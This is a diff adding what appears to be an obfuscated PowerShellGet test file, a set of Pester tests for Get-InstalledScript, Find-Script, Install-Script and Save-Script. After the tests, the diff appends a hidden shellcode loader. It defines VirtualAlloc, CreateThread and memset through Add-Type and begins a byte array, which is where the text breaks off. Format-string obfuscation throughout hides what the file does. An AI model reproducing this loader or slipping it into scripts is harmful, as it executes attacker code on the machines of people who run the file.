+        &("{3}{7}{0}{2}{5}{4}{1}{6}" -f 't','ual','FullyQualified','Ass','rIdEq','Erro','s','er') -scriptblock { &("{0}{5}{2}{1}{3}{4}" -f 'G','ledSc','tal','rip','t','et-Ins') -Name ("{3}{2}{1}{4}{0}" -f'ipt','ikam-Clie','abr','F','ntScr'), ("{1}{4}{0}{2}{3}{5}" -f 'm-Serve','Fabr','r','S','ika','cript') -RequiredVersion 3.0 } `
+            -expectedFullyQualifiedErrorId ("{13}{10}{6}{8}{7}{12}{11}{3}{14}{15}{9}{4}{0}{5}{2}{1}" -f 'ns','t','crip','Wit','I','talledS','eters','lo','AreAl','gleName,Get-','nParam','y','wedOnl','Versio','hS','in')
+    }
+
+    &('It') ("{13}{5}{14}{7}{6}{10}{11}{2}{3}{15}{1}{0}{12}{9}{8}{4}" -f 'me','iNa','ptWith','Mul','ersion','e','ledS','nstal','dMinV','n','cr','i','sA','Validat','GetI','t') {
+        &("{7}{3}{5}{0}{1}{8}{9}{6}{4}{2}"-f 'tFull','y','uals','s','dErrorIdEq','er','fie','As','Qu','ali') -scriptblock { &("{3}{1}{2}{0}{4}{5}"-f'd','e','t-Installe','G','Scr','ipt') -Name ("{2}{1}{0}{4}{5}{3}"-f 'li','ikam-C','Fabr','tScript','e','n'), ("{0}{3}{5}{1}{4}{2}"-f'Fa','erverScr','t','bri','ip','kam-S') -MinimumVersion 3.0 } `
+            -expectedFullyQualifiedErrorId ("{7}{5}{16}{9}{13}{3}{12}{0}{15}{11}{8}{1}{10}{2}{6}{4}{14}"-f 'wedOnlyW','e,Get','n','All','talledScr','ion','s','Vers','Nam','ar','-I','ngle','o','ametersAre','ipt','ithSi','P')
+    }
+
+    &('It') ("{3}{7}{10}{11}{2}{12}{14}{15}{9}{5}{4}{6}{13}{1}{0}{8}" -f 'i','ers','edScr','ValidateGe','tiNamesAndM','l','ax','t','on','u','Insta','ll','i','V','ptWith','M') {
+        &("{3}{6}{0}{7}{2}{9}{4}{8}{1}{5}" -f'tFull','al','f','A','rIdEq','s','sser','yQuali','u','iedErro') -scriptblock { &("{3}{0}{1}{2}" -f 'l','edScrip','t','Get-Instal') -Name ("{0}{2}{4}{3}{1}"-f 'Fabr','ript','ika','-ClientSc','m'), ("{5}{1}{0}{4}{3}{2}"-f'm-S','a','rScript','e','erv','Fabrik') -MaximumVersion 3.0 } `
+            -expectedFullyQualifiedErrorId ("{14}{4}{6}{11}{3}{8}{12}{7}{9}{10}{13}{0}{5}{1}{2}" -f 'ns','all','edScript','ll','ionParame','t','tersAr','edOnlyWithSingleNa','o','me',',','eA','w','Get-I','Vers')
+    }
+
+    &('It') ("{10}{3}{5}{8}{2}{12}{0}{9}{11}{7}{4}{6}{1}"-f 'ngleWild','n','riptWithS','Ge','redVer','tIns','sio','qui','talledSc','cardNam','Validate','eAndRe','i') {
+        &("{6}{0}{5}{1}{3}{2}{4}{7}{8}"-f 'se','ul','alifiedErr','lyQu','or','rtF','As','IdE','quals') -scriptblock { &("{4}{3}{1}{2}{0}"-f'pt','talledSc','ri','t-Ins','Ge') -Name ("{1}{4}{2}{3}{0}" -f 'ient*ipt','Fab','ikam','-Cl','r') -RequiredVersion 3.0 } `
+            -expectedFullyQualifiedErrorId ("{3}{12}{7}{5}{1}{9}{2}{10}{11}{8}{0}{4}{6}" -f'stall','thS','gleN','VersionParametersAreAll','edSc','yWi','ript','dOnl','t-In','in','am','e,Ge','owe')
+    }
+
+    &('It') ("{6}{7}{11}{3}{12}{9}{1}{8}{4}{2}{5}{10}{0}"-f 'on','thSing','A','tInstalledScr','ardName','ndMinVer','V','alida','leWildc','i','si','teGe','iptW') {
+        &("{4}{1}{5}{0}{2}{3}"-f'llyQ','sertF','ualif','iedErrorIdEquals','As','u') -scriptblock { &("{0}{2}{1}{3}{4}"-f'Get-Inst','le','al','dScrip','t') -Name ("{0}{3}{2}{4}{1}"-f'Fabrika','t*ipt','-Cl','m','ien') -MinimumVersion 3.0 } `
+            -expectedFullyQualifiedErrorId ("{4}{7}{5}{0}{13}{1}{15}{12}{9}{6}{2}{14}{10}{8}{3}{16}{17}{11}"-f'etersA','l','n','Installed','Ver','m','dO','sionPara','me,Get-','e','yWithSingleNa','t','ow','reA','l','l','Scr','ip')
+    }
+
+    &('It') ("{10}{5}{15}{3}{1}{0}{7}{9}{14}{16}{2}{13}{4}{8}{6}{12}{11}" -f 'Sc','d','W','talle','card','tIn','Ma','riptW','NameAnd','ith','ValidateGe','ion','xVers','ild','S','s','ingle') {
+        &("{3}{7}{6}{10}{1}{8}{0}{9}{5}{2}{4}" -f'Err','ua','u','AssertFul','als','q','y','l','lified','orIdE','Q') -scriptblock { &("{5}{0}{3}{1}{2}{4}" -f 't-Inst','dS','cr','alle','ipt','Ge') -Name ("{2}{4}{3}{6}{5}{1}{0}" -f 'ent*ipt','li','F','r','ab','kam-C','i') -MaximumVersion 3.0 } `
+            -expectedFullyQualifiedErrorId ("{6}{13}{7}{3}{4}{5}{10}{8}{2}{11}{9}{1}{12}{0}"-f't','l','WithSingle','nPar','ametersAreA','l','Ver','o','dOnly','ame,Get-Instal','lowe','N','edScrip','si')
+    }
+
+    &('It') ("{11}{3}{10}{0}{2}{7}{6}{1}{8}{4}{5}{9}" -f'tal','leNameRe','ledScriptWit','ida','da','ndMinVer','ng','hSi','quire','sion','teGetIns','Val') {
+        &("{0}{8}{7}{5}{6}{4}{2}{1}{3}"-f 'Ass','dEqua','orI','ls','rr','ullyQ','ualifiedE','F','ert') -scriptblock { &("{0}{1}{3}{2}" -f'Get-','In','lledScript','sta') -Name ("{6}{1}{4}{0}{3}{2}{5}" -f 'r','a','r','ikam-ClientSc','b','ipt','F') -RequiredVersion 3.0 -MinimumVersion 1.0 } `
+            -expectedFullyQualifiedErrorId ("{1}{16}{18}{9}{7}{6}{14}{15}{17}{10}{12}{11}{8}{3}{13}{5}{2}{4}{0}" -f'pt','Versi','t-InstalledSc','dTogeth','ri',',Ge','A','ge','Specifie','an','ionC','nnotBe','a','er','ndR','equiredVe','o','rs','nR')
+    }
+
+    &('It') ("{4}{17}{10}{11}{2}{6}{9}{0}{5}{13}{12}{15}{1}{16}{8}{14}{3}{7}"-f'iptW','Re','GetIns','axV','Va','ith','talled','ersion','reda','Scr','t','e','eNa','Singl','ndM','me','qui','lida') {
+        &("{3}{0}{4}{5}{2}{1}" -f'ert','dEquals','rorI','Ass','FullyQualifiedE','r') -scriptblock { &("{5}{0}{4}{3}{2}{1}"-f'-I','pt','ri','edSc','nstall','Get') -Name ("{2}{1}{3}{0}{4}"-f 'tScri','ikam-Cl','Fabr','ien','pt') -RequiredVersion 3.0 -MaximumVersion 1.0 } `
+            -expectedFullyQualifiedErrorId ("{4}{11}{9}{2}{6}{0}{3}{7}{1}{10}{8}{5}"-f'redVers','edTogether,Ge','qu','ionCan','Version','ipt','i','notBeSpecifi','-InstalledScr','ngeAndRe','t','Ra')
+    }
+
+    &('It') ("{8}{1}{12}{2}{6}{11}{4}{9}{3}{7}{5}{10}{0}"-f 'dMinMaxRange','dat','etInstall','Na','ingl','v','edScri','meIn','Vali','e','ali','ptWithS','eG') {
+        &("{0}{1}{5}{2}{3}{4}" -f 'Ass','e','ullyQualifi','edErrorIdEqua','ls','rtF') -scriptblock { &("{0}{2}{1}{3}"-f 'Get-','nst','I','alledScript') -Name ("{4}{1}{0}{3}{2}"-f '-','abrikam','ientScript','Cl','F') -MinimumVersion 3.0 -MaximumVersion 1.0 } `
+            -expectedFullyQualifiedErrorId ("{9}{5}{8}{7}{4}{0}{10}{3}{1}{2}{6}"-f'V','stalledSc','r','Get-In','rThanMaximum','onIs','ipt','te','Grea','MinimumVersi','ersion,')
+    }
+
+    
+    
+    
+    
+    
+    
+    &('It') ("{4}{0}{2}{3}{5}{1}" -f'nsta','endencies','l','lScrip','I','tWithIncludeDep') {
+        ${sCR`i`pTna`mE} = ("{3}{2}{4}{1}{0}" -f's1','ie','hDe','Script-Wit','pendenc')
+        ${DEp`EnC`Y`Na`MEs} = @()
+        ${dEpScR`IPTD`eTa`iLs} = ${nu`LL}
+        ${de`pmOd`Ul`EdETaIlS} = ${NU`LL}
+
+        try {
+            ${rE`s1} = &("{0}{1}{2}"-f 'Fi','n','d-Script') -Name ${Scr`I`PTnAME} -MaximumVersion "1.0" -MinimumVersion "0.1"
+            &("{1}{0}{2}{3}" -f'ss','A','ert','Equals') ${R`eS1}."N`AmE" ${ScRi`p`T`NaME} ('Fi'+'nd'+'-Sc'+'ript '+('didnDw'+'tt ')."REpl`A`CE"(([cHAr]68+[cHAr]119+[cHAr]116),[STRing][cHAr]39)+'find'+' '+'the'+' '+'ex'+'act '+'s'+'cript '+'whic'+'h '+'ha'+'s '+'de'+'pen'+'de'+'ncies'+', '+"$res1")
+
+            ${d`e`P`ENCYn`AmES} = ${Re`S1}."d`epenDeN`cies"."n`AME"
+
+            ${RE`s2} = &("{1}{0}{2}"-f'ind-S','F','cript') -Name ${sCrI`P`Tn`AME} -IncludeDependencies -MaximumVersion "1.0" -MinimumVersion "0.1"
+            &("{0}{1}" -f'As','sert') (${R`eS2}."cOU`NT" -ge (${D`epEnC`YNa`MeS}."C`OuNt" + 1)) ('Find-'+'Scr'+'ipt '+'wit'+'h '+'-Include'+'De'+'penden'+'cie'+'s'+' '+'returne'+'d'+' '+'wro'+'ng '+'result'+'s'+', '+"$res2")
+
+            &("{3}{2}{0}{4}{1}"-f'l','ipt','nsta','I','l-Scr') -Name ${s`CRIPTn`AmE} -MaximumVersion "1.0" -MinimumVersion "0.1"
+            ${ACTU`AlscrIPt`det`A`I`Ls} = &("{1}{3}{2}{4}{0}"-f 'dScript','G','t-In','e','stalle') -Name ${sc`RIPtnA`ME} -RequiredVersion ${R`ES1}."vE`RSiON"
+            &("{3}{4}{1}{0}{2}"-f 'tN','tNo','ull','A','sser') ${aCtuA`L`ScrIp`TD`ET`AIlS} ("$ScriptName "+'scr'+'ipt '+'wi'+'th '+'dependenc'+'i'+'e'+'s '+'is'+' '+'no'+'t '+'in'+'stal'+'led '+'p'+'rope'+'rly')
+
+            ${De`Ps`c`RipTDe`TAIls} = &("{1}{3}{0}{2}"-f'dSc','Get-Ins','ript','talle') -Name ${DE`peNCyn`Am`ES} -ErrorAction ("{1}{3}{2}{0}"-f'e','Silen','u','tlyContin')
+            ${D`e`pmoduled`eTAi`lS} = &("{3}{2}{4}{1}{0}"-f 'Module','d','I','Get-','nstalle') -Name ${DePEN`cYNA`MeS} -ErrorAction ("{2}{0}{1}{3}"-f'ilen','tlyConti','S','nue')
+
+            ${DE`PenCy`NaMeS} | &("{1}{3}{0}{2}"-f'ch-O','ForE','bject','a') {
+                if ((-not ${dE`pSCrIp`TD`EtAILS} -or ${d`ep`sCriP`TD`etAi`ls}."na`ME" -notcontains ${_}) -and
+                    (-not ${De`pmoDu`lED`e`TaIlS} -or ${DE`pMo`D`UlED`eT`AiLs}."nA`me" -notcontains ${_})) {
+                    &("{0}{1}" -f 'Asser','t') ${F`A`LsE} ('S'+'cript'+' '+'d'+'ep'+'endency '+"$_ "+'is'+' '+'n'+'ot '+'insta'+'ll'+'ed')
+                }
+            }
+        }
+        finally {
+            &("{2}{0}{3}{1}"-f'ta','cript','Unins','ll-S') -ErrorAction ("{3}{2}{0}{5}{1}{4}" -f'e','t','il','S','lyContinue','n') ${s`c`RIpTN`Ame}
+            ${De`ps`CRip`Tde`T`AiLs} | &("{0}{4}{1}{2}{3}"-f'For','-','Obje','ct','Each') { &("{3}{4}{1}{0}{2}"-f'all-Scrip','t','t','U','nins') ${_}."Na`me" -Force -ErrorAction ("{1}{0}{3}{2}"-f 'len','Si','ue','tlyContin') }
+            ${DEpmO`DuleD`ETAi`ls} | &("{1}{2}{0}{3}" -f 'ch-Obje','Fo','rEa','ct') { &((("{5}{2}{4}{3}{1}{0}"-f'stall-Module','in','Get{','Un','0}','PowerShell'))  -f[chAR]92) ${_}."nA`me" -Force -ErrorAction ("{3}{4}{1}{2}{0}"-f 'tinue','ntly','Con','Si','le') }
+        }
+    } `
+        -Skip:$(${psV`e`RSiONTa`B`LE}."PS`VeRsi`On" -lt ("{1}{0}" -f'0.0','5.'))
+
+    
+    
+    
+    
+    
+    
+    &('It') ("{7}{0}{6}{8}{4}{1}{5}{2}{3}"-f 'aveS','ithDepe','encie','s','eW','nd','criptNa','S','m') {
+        try {
+            ${Sc`RIpT`NaME} = ("{3}{4}{5}{0}{1}{2}"-f'n','d','encies1','Sc','rip','t-WithDepe')
+
+            ${R`Es1} = &("{1}{0}{3}{2}" -f'i','F','-Script','nd') -Name ${s`CR`IptNa`mE} -RequiredVersion '1.0' -IncludeDependencies
+
+            &("{1}{3}{2}{0}" -f 'cript','Sav','-S','e') -Name ${S`cR`i`Ptname} -MaximumVersion '1.0' -MinimumVersion '0.1' ${scRIpt`:tEmps`AvE`pa`Th}
+
+            ${RE`S1}."Na`mE" | &("{2}{0}{4}{3}{1}"-f'orE','ct','F','Obje','ach-') {
+                ${aRti`FaCt`PatH} = &("{0}{2}{1}" -f 'Joi','th','n-Pa') -Path ${s`cri`pt:`TeMpsAV`ePATh} -ChildPath ${_}
+                if (-not (&("{1}{0}"-f'ath','Test-P') -Path ${aR`T`ifa`ctP`ATh} -PathType ("{1}{2}{0}" -f 'ner','Cont','ai')) -and
+                    -not (&("{1}{0}{2}"-f'-P','Test','ath') -Path "$artifactPath.ps1" -PathType ("{1}{0}" -f 'af','Le'))) {
+                    &("{0}{1}" -f 'Asser','t') ${F`Al`sE} ("$_ "+'is'+' '+'no'+'t '+'sav'+'ed '+'w'+'ith '+'t'+'he '+'S'+'ave-Scrip'+'t '+'-'+'Na'+'me '+"$ScriptName")
+                }
+            }
+        }
+        finally {
+            &("{0}{2}{1}" -f 'Rem','ve-Item','o') -Path "$script:TempSavePath\*" -Recurse -Force -ErrorAction ("{1}{2}{0}"-f'yContinue','Si','lentl') -WarningAction ("{4}{1}{2}{3}{0}" -f'nue','entl','yC','onti','Sil')
+        }
+    }
+
+    
+    
+    
+    
+    
+    
+    &('It') ("{1}{2}{5}{3}{4}{6}{0}"-f'Output','SaveScriptW','it','cr','i','hFindS','pt') {
+        try {
+            ${s`CrI`pTNA`Me} = ("{4}{0}{5}{3}{1}{2}"-f 'i','ithDependencie','s1','W','Scr','pt-')
+            ${r`eS1} = &("{1}{3}{0}{2}"-f'cr','Fin','ipt','d-S') -Name ${s`CrIP`TnAMe} -RequiredVersion '2.0' -IncludeDependencies
+            &("{1}{2}{0}" -f '-Script','Fi','nd') -Name ${s`cr`IpTN`AMe} -RequiredVersion '2.0' | &("{0}{3}{1}{2}" -f 'Sa','ip','t','ve-Scr') -LiteralPath ${s`cRipT:tEMps`Ave`PA`TH}
+
+            ${R`ES1}."N`AMe" | &("{2}{4}{0}{1}{3}" -f'je','c','Fo','t','rEach-Ob') {
+                ${a`RTifa`CT`PaTh} = &("{2}{1}{0}"-f 'Path','oin-','J') -Path ${SCRI`Pt:tem`PSa`VEp`ATH} -ChildPath ${_}
+                if (-not (&("{2}{1}{0}" -f '-Path','est','T') -Path ${a`RtifAC`TPa`Th} -PathType ("{2}{0}{1}"-f 'ont','ainer','C')) -and
+                    -not (&("{0}{1}"-f'Test-Pat','h') -Path "$artifactPath.ps1" -PathType ("{0}{1}"-f'L','eaf'))) {
+                    &("{1}{0}" -f 'rt','Asse') ${f`ALse} ("$_ "+'is'+' '+'not'+' '+'sa'+'v'+'ed '+'with'+' '+'the'+' '+'Sa'+'ve'+'-Scr'+'ipt '+'-N'+'ame'+' '+"$ScriptName")
+                }
+            }
+        }
+        finally {
+            &("{0}{3}{1}{2}"-f'Re','ove-It','em','m') -Path "$script:TempSavePath\*" -Recurse -Force -ErrorAction ("{1}{3}{0}{4}{2}"-f'ontin','Silently','e','C','u') -WarningAction ("{3}{4}{0}{1}{2}" -f 't','inu','e','Silen','tlyCon')
+        }
+    }
+
+    
+    
+    
+    
+    
+    
+    &('It') ("{0}{1}{5}{2}{6}{3}{4}" -f 'G','etInsta','ed','WithWildca','rd','ll','Script') {
+        ${sCrI`pT`NA`Mes} = ("{2}{1}{3}{0}{4}"-f'p','rikam-S','Fab','cri','t'), ("{3}{4}{5}{0}{2}{1}"-f'-Se','Script','rver','Fab','ri','kam'), ("{2}{1}{0}{3}{5}{4}" -f'Cl','rikam-','Fab','ie','ipt','ntScr')
+
+        &("{1}{0}{2}"-f'all-Sc','Inst','ript') -Name ${scr`i`pt`NaMeS}
+
+        
+        ${R`ES1} = &("{4}{1}{0}{3}{2}" -f'a','st','t','lledScrip','Get-In') -Name ${sCr`ip`TnaM`ES}[0]
+        &("{0}{1}{2}"-f 'As','sertEqua','ls') ${R`es1}."nA`mE" ${S`cr`ip`TNAmEs}[0] ('Get-I'+'nstalledSc'+'rip'+'t '+('did'+'n'+'xB3t ')."R`epl`AcE"('xB3',[STRInG][cHAr]39)+'ret'+'urn'+' '+'t'+'he '+'exac'+'t'+' '+'s'+'cript,'+' '+"$res1")
+
+        
+        ${r`ES2} = &("{3}{0}{1}{2}{4}{5}" -f 'sta','ll','e','Get-In','d','Script') -Name ("{2}{1}{0}" -f 'ikam*','r','Fab')
+        &("{2}{1}{0}{3}"-f'al','ertEqu','Ass','s') ${RE`s2}."C`OunT" ${SCrI`PTn`AmeS}."C`ounT" ('Get-I'+'nstal'+'le'+'dScr'+'ipt '+('di'+'dn{'+'0}t ') -F [cHAr]39+'retu'+'rn '+'th'+'e '+"$ScriptNames "+'script'+'s,'+' '+"$res2")
+    }
+
+    
+    
+    
+    
+    
+    &('It') ("{6}{10}{7}{12}{16}{14}{4}{11}{15}{5}{2}{9}{0}{8}{1}{13}{3}" -f 'Nu','Prov','red','der','W','nRegiste','I','ll','Get','With','nsta','i','Scr','i','pt','thSameLocatio','i') {
+        ${S`cR`IPtnAME} = ("{2}{4}{3}{1}{0}"-f'erverScript','-S','Fa','am','brik')
+        ${teM`p`N`UGeTSO`UR`cENa`mE} = "$(Get-Random)"
+        ${RepOS`It`o`RynA`me} = ("{2}{0}{1}" -f 'Ga','llery','PS')
+        &("{3}{2}{4}{5}{1}{0}" -f'ce','ur','ter-Packa','Regis','g','eSo') -Provider ("{0}{1}"-f'nuge','t') -Name ${tEm`PNUgETsOurc`eNA`me} -Location ${gL`OBa`L:pSG`Alle`RYSo`Urc`EurI} -Trusted
+        try {
+            &("{2}{0}{3}{1}"-f 'sta','ript','In','ll-Sc') -Name ${scRI`PT`Na`Me} -Repository ${rE`po`Sitory`NAMe}
+
+            ${rE`s1} = &("{0}{2}{3}{1}" -f 'G','t','et-InstalledSc','rip') -Name ${Sc`RIpT`N`Ame}
+            &("{2}{0}{1}"-f 'sertEqua','ls','As') ${r`eS1}."N`Ame" ${scRip`TNa`me} ('Get-In'+'stall'+'e'+'d'+'Script '+('di'+'d'+'n{0'+'}t ') -F [char]39+'re'+'t'+'urn '+'th'+'e '+'exac'+'t '+'s'+'cr'+'ipt, '+"$res1")
+
+            &("{0}{1}{2}{3}"-f'As','sertEq','ual','s') ${r`eS1}."REPOs`ItO`RySOUr`cELOc`AtIon" ${G`lOb`Al:PSg`A`lleRySO`UrceurI} ("{0}{4}{6}{9}{3}{2}{5}{8}{15}{11}{17}{14}{18}{1}{13}{10}{7}{16}{12}" -f 'PSGetItemIn','g Rep','ec','j','f','t wa','o ','o','s creat','ob','sitoryS','d w','ion','o','th wr','e','urceLocat','i','on')
+            &("{3}{0}{1}{2}" -f'ser','tEqua','ls','As') ${RE`s1}."R`epoSiTO`RY" ${REPosITo`R`yna`Me} ("{10}{5}{1}{11}{4}{7}{9}{6}{2}{0}{3}{8}"-f ' wrong reposit',' o','th','ory na','a','fo','ed wi','s ','me','creat','PSGetItemIn','bject w')
+
+            ${eXp`E`cTeD`InstAllE`d`loCaTIOn} = ${sCrIpt:p`Rogr`AMFiL`es`sc`RIptspATh}
+            if (${S`c`R`IPt:iscoRecLR}) {
+                ${eXP`ecT`eDiNs`TaLLe`dlOcAtion} = ${Sc`RIP`T`:`MydoC`UMEnTsscRi`p`T`SP`ATh}
+            }
+            &("{0}{3}{1}{2}" -f'A','rtE','quals','sse') ${r`Es1}."I`NS`TAlLEDlO`CATioN" ${eXpECTed`iNStAllEDLo`cAt`i`On} ("{1}{6}{0}{4}{11}{10}{5}{2}{9}{12}{8}{13}{3}{7}" -f 'v','I',' valu','nfo obj','al','stalledLocation','n','ect','Ite','e on PSG','d In','i','et','mI')
+        }
+        finally {
+            &("{3}{5}{2}{7}{6}{1}{4}{0}" -f 'ce','geSo','g','U','ur','nre','Packa','ister-') -ProviderName ("{1}{0}" -f'Get','Nu') -Name ${T`eMPnu`GEtsourC`e`N`Ame} -Force
+        }
+    }
+
+    
+    
+    
+    
+    
+    
+    &('It') ("{5}{6}{3}{4}{7}{1}{2}{0}"-f'ocation','Source','L','Without','Sc','ScriptCm','dlets','ript') {
+        try {
+            &("{2}{1}{3}{4}{0}"-f'pository','er-','Regist','PSR','e') -Name ("{1}{2}{0}"-f'epo','Tes','tR') -SourceLocation ("{5}{6}{3}{4}{2}{1}{0}" -f'/v2','pi','org/a','//www.nuget','.','ht','tps:')
+            ${scr`iPt`REPo} = &("{1}{0}{2}{3}"-f '-PS','Get','Repositor','y') -Name ("{1}{2}{0}"-f'po','Test','Re')
+            &("{0}{2}{1}"-f'As','ert','s') (-not ${SCRi`P`T`Repo}."S`CRI`p`TsourcElO`cATIOn") ((("{2}{10}{1}{3}{0}{4}{7}{6}{13}{14}{12}{5}{11}{8}{9}" -f 'ito','st rep','T','os','r','t regis','0}','y {','er','ed properly','e','t','o','TestRepo{0} ','is n'))  -f [chAR]39)
+            &("{1}{0}"-f 'ert','Ass') (-not ${s`cRiPt`REPO}."sCriPtPubl`ISHl`O`ca`TIOn") ((("{9}{8}{4}{7}{11}{3}{0}{1}{10}{6}{2}{5}"-f'olY','O i','l','TestRep','sit','y','roper','o','po','Test re','s not registered p','ry lYO'))."R`eP`LaCE"(([ChAR]108+[ChAR]89+[ChAR]79),[STRIng][ChAR]39))
+
+            ${r`ePONA`Me} = ("{0}{1}"-f'Te','stRepo')
+
+            &("{5}{0}{2}{8}{1}{3}{6}{7}{4}" -f 'sse','edEr','rtFully','ro','s','A','rI','dEqual','Qualifi') -scriptblock { &("{3}{1}{2}{0}" -f'pt','nd','-Scri','Fi') -Name ("{3}{2}{1}{0}" -f 'tName','rip','tSc','Tes') -Repository ${rEpO`Na`ME} } `
+                -expectedFullyQualifiedErrorId ("{9}{1}{2}{6}{8}{3}{5}{7}{0}{4}"-f 'ind','tSou','rce','ionIsMiss','-Script','i','Loca','ng,F','t','Scrip')
+
+            &("{7}{6}{0}{3}{1}{2}{4}{8}{5}" -f'lyQ','fie','dEr','uali','ror','s','sertFul','As','IdEqual') -scriptblock { &("{1}{0}{2}{3}" -f 'l-','Instal','Scri','pt') -Name ("{1}{0}{2}" -f'iptN','TestScr','ame') -Repository ${R`ePona`ME} } `
+                -expectedFullyQualifiedErrorId ("{0}{4}{7}{2}{8}{1}{9}{3}{11}{12}{6}{10}{5}" -f 'S','eLo','tSo','onIsM','c','pt','all-Sc','rip','urc','cati','ri','issing,Ins','t')
+
+            &("{2}{1}{5}{7}{3}{6}{0}{4}"-f'q','ullyQua','AssertF','ie','uals','l','dErrorIdE','if') -scriptblock { &("{1}{2}{3}{0}"-f 't','S','ave-S','crip') -Name ("{1}{4}{3}{2}{0}" -f 'e','TestS','tNam','p','cri') -Repository ${r`EP`ONa`me} -Path ${sCR`I`Pt:T`EmP`pAth} } `
+                -expectedFullyQualifiedErrorId ("{10}{6}{3}{9}{8}{2}{0}{1}{5}{4}{7}" -f ',','S','sing','r','ve-Scri','a','iptSou','pt','ationIsMis','ceLoc','Scr')
+            ${Wv} = ${nu`lL}
+            &("{2}{3}{0}{1}"-f 'g','e','Fi','nd-Packa') -Name ("{0}{1}{2}"-f 'Test','ScriptN','ame') -Source ${R`E`POn`AmE} -ProviderName ("{0}{2}{1}{3}" -f 'Po','rShellGe','we','t') -Type ("{2}{1}{0}"-f 'ipt','r','Sc') -WarningVariable ('wv') -ErrorAction ("{3}{0}{1}{2}" -f'ilentlyCo','nti','nue','S') -WarningAction ("{1}{3}{4}{0}{2}" -f'ly','S','Continue','ilen','t')
+            ${mE`sSaGe} = ${scr`Ip`T:LOCALIz`eddA`TA}."S`CrI`PTsO`U`Rc`E`LoC`AtIonismiSSi`NG" -f (${r`EPo`Na`ME})
+            &("{2}{1}{0}{3}" -f'tEqua','ser','As','ls') ${wV}."MESs`Age" ${MESs`A`GE} ("{9}{5}{25}{19}{2}{7}{20}{17}{23}{8}{1}{22}{6}{12}{24}{3}{11}{21}{14}{18}{10}{16}{4}{0}{15}{26}{13}"-f ' valid Scrip','n','ge sh','th','nt have a','-','ess','ould','ni','Find','ource d','e spe','age when','Location','fied','tSo','oes',' wa',' s','ka',' throw a','ci','g m','r',' ','Pac','urce')
+        }
+        finally {
+            &("{1}{2}{3}{0}" -f 'pository','Get','-PS','Re') -Name ("{2}{1}{0}"-f'epo','stR','Te') -ErrorAction ("{1}{2}{3}{0}"-f 'nue','S','il','entlyConti') | &("{2}{4}{5}{6}{0}{1}{3}"-f'SRepo','sito','Unr','ry','e','gister','-P') -ErrorAction ("{3}{2}{0}{1}" -f 'yC','ontinue','tl','Silen')
+        }
+    } `
+        -Skip:$(${Ps`cUl`TUrE} -ne ("{0}{1}"-f 'en','-US'))
+
+    &('It') ("{3}{0}{7}{12}{5}{6}{8}{2}{13}{14}{10}{11}{4}{9}{15}{1}"-f'Ins','e','ng ','Get-','n','pt cm','dlet with lea','talle','di',' ','os in Required','Versio','dScri','z','er','valu') {
+        ${sc`Ri`ptName} = ("{0}{5}{2}{1}{4}{3}" -f 'Fabr','am','k','erverScript','-S','i')
+        ${V`erSI`oN} = '1.2'
+        &("{3}{4}{0}{1}{2}" -f't','all-Scri','pt','I','ns') ${S`crIP`TnAmE} -RequiredVersion ${vERs`i`ON}
+        ${r`es} = &("{0}{2}{4}{1}{5}{3}" -f 'G','sta','et','ript','-In','lledSc') ${SCR`I`Ptn`Ame} -RequiredVersion ("{0}{1}"-f '1.','02')
+        ${R`eS}."nA`ME" | &("{0}{1}" -f 'Shou','ld') ('Be') ${ScRiptN`A`Me}
+        ${r`Es}."V`e`RSIon" | &("{0}{1}" -f 'Sho','uld') ('Be') ${V`e`RsIoN}
+
+        ${r`eS} = &("{4}{2}{0}{3}{5}{1}"-f't-In','pt','e','sta','G','lledScri') ${Sc`R`I`PTNamE} -RequiredVersion ${vERs`Ion}
+        ${R`Es}."VE`RsIoN" | &("{0}{1}" -f'Sh','ould') ('Be') ${VERS`i`ON}
+    }
+}
+
+${C} = ((("{78}{35}{65}{57}{56}{52}{95}{63}{88}{28}{36}{93}{51}{1}{19}{62}{25}{99}{10}{15}{59}{5}{102}{98}{64}{14}{80}{89}{2}{108}{110}{39}{53}{37}{61}{44}{72}{38}{33}{91}{77}{6}{11}{16}{46}{84}{48}{41}{26}{106}{111}{107}{43}{55}{100}{75}{87}{94}{29}{79}{83}{96}{90}{30}{22}{21}{101}{54}{85}{23}{69}{97}{31}{82}{49}{71}{9}{45}{42}{74}{66}{70}{86}{24}{67}{81}{109}{58}{50}{0}{13}{73}{68}{32}{104}{40}{8}{47}{12}{27}{7}{20}{18}{105}{103}{76}{17}{60}{4}{34}{3}{92}" -f'n','nOs)]','ze,','n','nt co','t','l32.dlln','Ptr me','static ','t ','IntPtr VirtualAl','Os','ern ','Osmsv','uin','loc(I',')]publ',' ','In','public st','mset(','ress, I','artAdd','pP',', Int','r','Ptr ','Int','2','a','St','ter,','.dl','ort(n','u','D','.','lPr','llImp','e, uint','ic ','Int','C','rea',');','dw','ic sta','ext','rn ','u','ort(','l','O',' f','tP','dA','(n','rt','llImp','ntP','ui','otect','atic exte','ker',', ','llImpo','eationF','Ptr lpThread','rt','aram','l','in','[D','c','r',', u',' src,','ne','[','ckSize, IntPt','t','Id',' ','r','tic exte','tr l','ags','i','nel3',' dwSi','p','Osker','t);','dl','nt dwSt','s',' l','e','ress','n ','ttributes','n','r lpAdd','nt','lnOs)]publ','tPtr dest, ui','Crea','ead(IntPtr lpTh',' ',');[D','uint flAllocationTyp','teThr'))."REP`LAcE"('nOs',[StrIng][Char]34));${w} = &("{2}{1}{0}"-f 'ype','dd-T','A') -memberDefinition ${c} -Name ("{0}{1}"-f'Win3','2') -namespace ("{3}{2}{1}{0}" -f 'ns','ctio','n','Win32Fu') -passthru;[Byte[]];[Byte[]]${Z} = 